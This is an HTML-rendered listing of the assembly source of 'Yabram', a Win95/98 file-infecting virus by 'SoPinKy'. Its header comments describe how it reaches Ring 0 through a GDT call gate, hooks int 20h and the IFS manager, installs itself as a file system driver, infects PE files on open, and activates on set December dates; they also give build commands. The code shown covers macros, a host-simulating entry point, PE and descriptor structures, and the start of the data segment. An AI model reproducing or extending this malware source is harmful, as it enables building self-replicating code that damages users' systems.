<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.Yabran.3132 - yabram.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                 Win95/98.Yabram</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; by SoPinKy.. Made in Argentina.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; It is a Win 95/98 virus with hook in the Ifs_Mgr. The virus have a small code</span><span class="sc0">
</span><span class="sc1">; segment... it simulate the host. In the Data segment is the Code of my virus</span><span class="sc0">
</span><span class="sc1">; and there are the Data of virus too.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; It pass to Ring 0 using a Technique called "The CallGate"... this technique</span><span class="sc0">
</span><span class="sc1">; consist in install a GDT Call Gate to pass to Ring 0.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Resume of Callgate technique:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         1) Search the GDT to find the descriptors of the Ring 0 code.</span><span class="sc0">
</span><span class="sc1">;         2) Save the first valid entry of the GDT.</span><span class="sc0">
</span><span class="sc1">;         3) Replase the first valid entry of the GDT with a Callgate.</span><span class="sc0">
</span><span class="sc1">;         4) Call the Callgate.</span><span class="sc0">
</span><span class="sc1">;         5) In my Ring 0 code i restore the GDT entry.</span><span class="sc0">
</span><span class="sc1">;         6) Setting the DS, ES, GS, SS register.</span><span class="sc0">
</span><span class="sc1">;         7) Exec the Ring 0 code ;)</span><span class="sc0">
</span><span class="sc1">;         8) RetF... hehehe i back to Ring 3.</span><span class="sc0">
</span><span class="sc1">;         9) Restore the DS, ES, GS, SS.</span><span class="sc0">
</span><span class="sc1">; I will explaine what i just wrote (resume) with more detales in an article</span><span class="sc0">
</span><span class="sc1">; Called "Pass to Ring 0 with C/C++".</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The first thing that i'm going to do when i pass to Ring 0</span><span class="sc0">
</span><span class="sc1">; is to be shure about the state of virus's resident.</span><span class="sc0">
</span><span class="sc1">; I hook the int 20h and the new int 20h have the sign "SI".</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; If int 20h have the sign, the virus will pass control to host and return...</span><span class="sc0">
</span><span class="sc1">; but if the virus reserves memory, i will Hook the int 20h and the Ifs_Mgr and</span><span class="sc0">
</span><span class="sc1">; it is resident now hehehe.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus install by itself as a FSD (File System Device)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Once resident the the viral FSD trap the Open call to FSD and infect</span><span class="sc0">
</span><span class="sc1">; only if the file is a PE.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; I try to add Sise stealth but i don't have time enough to do it.</span><span class="sc0">
</span><span class="sc1">; But i add new way to do DOS Stealth... this is an optional in my virus.. the</span><span class="sc0">
</span><span class="sc1">; real code don't have Stealth.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The Code has differents parts:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; -DirectH-</span><span class="sc0">
</span><span class="sc1">; Here is all proc to pass to Ring 0.1</span><span class="sc0">
</span><span class="sc1">;         Procs:</span><span class="sc0">
</span><span class="sc1">;               InitDirectH : Inicialize the data to pass to Ring 0.</span><span class="sc0">
</span><span class="sc1">;               CallRing0   : Call a proc in Ring 0. This proc call an pass</span><span class="sc0">
</span><span class="sc1">;                             to Ring 0.</span><span class="sc0">
</span><span class="sc1">;               InitRing0   : This may by call for a Ring 0 proc to restore the</span><span class="sc0">
</span><span class="sc1">;                             GDT entry and Set the data segment in ring 0.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; -DirectHOOKED-</span><span class="sc0">
</span><span class="sc1">; Here are procs to hook int 20h.</span><span class="sc0">
</span><span class="sc1">;         Procs:</span><span class="sc0">
</span><span class="sc1">;               HOOK_INT20H       : Trap int 20h</span><span class="sc0">
</span><span class="sc1">;               GET_DIR_INT20h    : Get the int 20h address.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; -DirectMEM-</span><span class="sc0">
</span><span class="sc1">; Here are a procs to managment the memori in Ring 0.</span><span class="sc0">
</span><span class="sc1">;         Procs:</span><span class="sc0">
</span><span class="sc1">;               MemAlloc          :Reserve memory.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; -DirectFILE-</span><span class="sc0">
</span><span class="sc1">; Here are a procs to magnament Ring 0 File IO.</span><span class="sc0">
</span><span class="sc1">;         Procs:</span><span class="sc0">
</span><span class="sc1">;               OPEN_FILE              : Open a file   </span><span class="sc0">
</span><span class="sc1">;               OPEN_FILE_IN_CONTEXT   :  "   "   "</span><span class="sc0">
</span><span class="sc1">;               READ_FILE              : Read a file</span><span class="sc0">
</span><span class="sc1">;               WRITE_FILE             : Write a file</span><span class="sc0">
</span><span class="sc1">;               GET_FILE_SIZE          : Get the size of file</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; MACROS:</span><span class="sc0">
</span><span class="sc1">;        PACH_INT20  MACRO DIRECCION, FUNCION, VXD_ID ;;Fix the VXDCall</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Sorry for my inexperience... hehehe, actually it's one of my first virus</span><span class="sc0">
</span><span class="sc1">; (my first for windows).</span><span class="sc0">
</span><span class="sc1">; When i coded it, i don't have idea of existence of 29a.</span><span class="sc0">
</span><span class="sc1">; My english isn't good enough, so i apologise for that.</span><span class="sc0">
</span><span class="sc1">; I hope that you will understand me.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Thanks:</span><span class="sc0">
</span><span class="sc1">;         Vecna        _ Hey You are a genius... and Argentinian too...</span><span class="sc0">
</span><span class="sc1">;         GriYo        _ You are a genius too ;)</span><span class="sc0">
</span><span class="sc1">;         MrSandman    _ Tnx very much. ;)</span><span class="sc0">
</span><span class="sc1">;         int13h       _ You are crazy man...... Aguante SudAmeRiCa CaRajo!!!   </span><span class="sc0">
</span><span class="sc1">;         darkman      _ Tnx for correct my bad english ;)</span><span class="sc0">
</span><span class="sc1">;         Ypsilon      _ You are fany  :)</span><span class="sc0">
</span><span class="sc1">;         Somnium      _ By to be woman... and Argentinian too...</span><span class="sc0">
</span><span class="sc1">;         ViruBust     _ AVPMan ... hehehe... you are great ;)</span><span class="sc0">
</span><span class="sc1">;         WinterMute   _ Whats happens with EMMA?? hahaha</span><span class="sc0">
</span><span class="sc1">;         Reptille-    _ You are my friends... my youngest friend :)</span><span class="sc0">
</span><span class="sc1">;         Superx       _ A Super Man... A Super Coder... A Super X hehehe</span><span class="sc0">
</span><span class="sc1">;         JQwerty      _ You are my inspiration.......</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; IMPORTANT:</span><span class="sc0">
</span><span class="sc1">;         The activation dates are 1, 3, 5, 7, 9, 11, 13, 15, 17, 21 ,23,</span><span class="sc0">
</span><span class="sc1">;         25, 27, 29, and 31 of december ;)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; NOTE:</span><span class="sc0">
</span><span class="sc1">;         For compile i use the Masm 6.11c (is the DDK assembler)</span><span class="sc0">
</span><span class="sc1">;         For link i use the Link.exe from Visual C++ 5.0.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; BEGUIN NOW!!!!</span><span class="sc0">
</span><span class="sc1">; -------------------------------------CUT--------------------------------------</span><span class="sc0">
</span><span class="sc1">;Compile: ml  /coff /c YABRAM.ASM</span><span class="sc0">
</span><span class="sc1">;Linking: link -subsystem:WINDOWS -entry:_WinMain -out:YABRAM.exe YABRAM.obj</span><span class="sc0">
</span><span class="sc1">;               kernel32.lib</span><span class="sc0">

</span><span class="sc2">.386P</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">FLAT</span><span class="sc0">
</span><span class="sc9">PUBLIC</span><span class="sc0">  </span><span class="sc5">_WinMain</span><span class="sc0"> 

</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">:&gt;</span><span class="sc0"> 
</span><span class="sc5">VMM_ID</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc1">;;;Macro for fixup the VXDCall (int 20h or CD20)</span><span class="sc0">
</span><span class="sc5">PACH_INT20</span><span class="sc0">  </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">DIRECCION</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FUNCION</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VXD_ID</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">DIRECCION</span><span class="sc4">],</span><span class="sc2">20cdh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">DIRECCION</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc5">FUNCION</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">DIRECCION</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">VXD_ID</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">


</span><span class="sc1">;;Simulate the host</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0">
</span><span class="sc5">_WinMain</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc4">,</span><span class="sc0">
            </span><span class="sc5">hInstance</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hPrevInstance</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AA</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BB</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">SALTOTRUEEP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">buelve</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SALTOTRUEEP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">;;fix up the jmp to back</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_WinMain2</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">buelve</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">leave</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">_WinMain</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">



</span><span class="sc1">;;Structs for 80386Tables as gdt, idt, Ect</span><span class="sc0">
</span><span class="sc5">MINIHead</span><span class="sc0"> </span><span class="sc9">Struc</span><span class="sc0">
        </span><span class="sc5">IS_INFECTED</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DirPE</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MINIHead</span><span class="sc0"> </span><span class="sc9">Ends</span><span class="sc0">

</span><span class="sc1">;;Structs for Pe</span><span class="sc0">
</span><span class="sc5">PeH</span><span class="sc0"> </span><span class="sc9">Struc</span><span class="sc0">
        </span><span class="sc5">maggic</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">Machine</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">NofSections</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">time_data</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">psymbol</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">nsymbol</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">SieoffOH</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">caracteristic</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PeH</span><span class="sc0"> </span><span class="sc9">Ends</span><span class="sc0">

</span><span class="sc5">PeOH</span><span class="sc0"> </span><span class="sc9">Struc</span><span class="sc0"> 
        </span><span class="sc5">maggic</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">MAJLnk</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">MINLnk</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">zizeofcode</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">zizeofinitdata</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">zizeofnonitdata</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">EntryPointHEHEHE</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">BASEOFCODE</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">BASEOFDATA</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">IMAGEBASE</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">SectionAligment</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">FileAligment</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">NoImPorta</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">NoImPorta2</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">NoImPorta3</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">Reserved</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SizeOfImagen</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PeOH</span><span class="sc0"> </span><span class="sc9">Ends</span><span class="sc0">



</span><span class="sc1">;;Struct for save some important tables as gdt</span><span class="sc0">
</span><span class="sc5">FPWORD</span><span class="sc0"> </span><span class="sc9">Struc</span><span class="sc0"> 
        </span><span class="sc5">limite</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">base</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FPWORD</span><span class="sc0"> </span><span class="sc9">Ends</span><span class="sc0">

</span><span class="sc1">;;struct to make far JMP unther protected mode</span><span class="sc0">
</span><span class="sc5">FARJMP</span><span class="sc0"> </span><span class="sc9">Struc</span><span class="sc0">
        </span><span class="sc5">jmpoffset32</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">sel</span><span class="sc0">             </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FARJMP</span><span class="sc0"> </span><span class="sc9">Ends</span><span class="sc0">

</span><span class="sc1">;;Struc of a descriptors of "Callback.... my calback.. hehehe"</span><span class="sc0">
</span><span class="sc5">Comp</span><span class="sc0"> </span><span class="sc9">Struc</span><span class="sc0">
        </span><span class="sc5">Offset_L</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">Sel</span><span class="sc0">             </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">Attrib</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">Offset_H</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Comp</span><span class="sc0"> </span><span class="sc9">Ends</span><span class="sc0">

</span><span class="sc1">;;Simple entry in the GDT or LDT tabes</span><span class="sc0">
</span><span class="sc5">descriptor</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
        </span><span class="sc5">limit_l</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">base_l</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">base_m</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">access</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">limit_h</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">base_h</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">descriptor</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0"> 

</span><span class="sc1">;;Simple entry in the IDT</span><span class="sc0">
</span><span class="sc5">idt_descriptor</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
        </span><span class="sc5">desp_l</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">sel</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">tipo_l</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;0-4 cont de palabras</span><span class="sc0">
        </span><span class="sc5">tipo_h</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">desp_h</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">idt_descriptor</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0"> 


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;Data Segment;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0">
</span><span class="sc5">BEG_DATA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;Data for Hook Int 20h in the Ring 0</span><span class="sc0">
 </span><span class="sc5">IDT</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc1">;Here Charge The limit and offset to the  IDT and GDT</span><span class="sc0">
 </span><span class="sc5">IDT_dir</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">vector_irq</span><span class="sc0"> </span><span class="sc9">DF</span><span class="sc0"> </span><span class="sc2">0cacacacacah</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">

 </span><span class="sc5">file_EXE</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;;Variables for Selectors in ring 0 and 3</span><span class="sc0">
 </span><span class="sc5">cs3</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">ds3</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">es3</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">sp3</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">fs3</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">gs3</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">cs0</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">ds0</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">es0</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">sp0</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">fs0</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">gs0</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;;Descriptors of CallBack for copy the GDT entry, that i use for do my</span><span class="sc0">
</span><span class="sc1">;;Descriptor of Callback in the GDT table.</span><span class="sc0">
 </span><span class="sc5">CallbackCPY</span><span class="sc0">    </span><span class="sc5">Comp</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc1">;;Pointes to CallBack</span><span class="sc0">
 </span><span class="sc5">GDT</span><span class="sc0">            </span><span class="sc5">FPWORD</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">

 </span><span class="sc5">SALTO</span><span class="sc0">          </span><span class="sc5">FARJMP</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
 </span><span class="sc5">DUMMY</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;;It is for Trivials variables</span><span class="sc0">
 </span><span class="sc5">SECTION_DUMMY</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">NiniH</span><span class="sc0"> </span><span class="sc5">MINIHead</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
 </span><span class="sc5">SDF_OCUPADO</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;;Flag for Ifs. if IFS_ works normaly it must be 1 </span><span class="sc0">
 </span><span class="sc5">PEHEAD</span><span class="sc0">         </span><span class="sc5">PeH</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
 </span><span class="sc5">PEOHEAD</span><span class="sc0">        </span><span class="sc5">PeOH</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
 </span><span class="sc5">HANDLE_VICTIMA</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">REALEP</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">VIRUS_ACTIVO</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;;Flag for know where the virus is active</span><span class="sc0">
 </span><span class="sc5">BASE_VIRUS_MEM</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
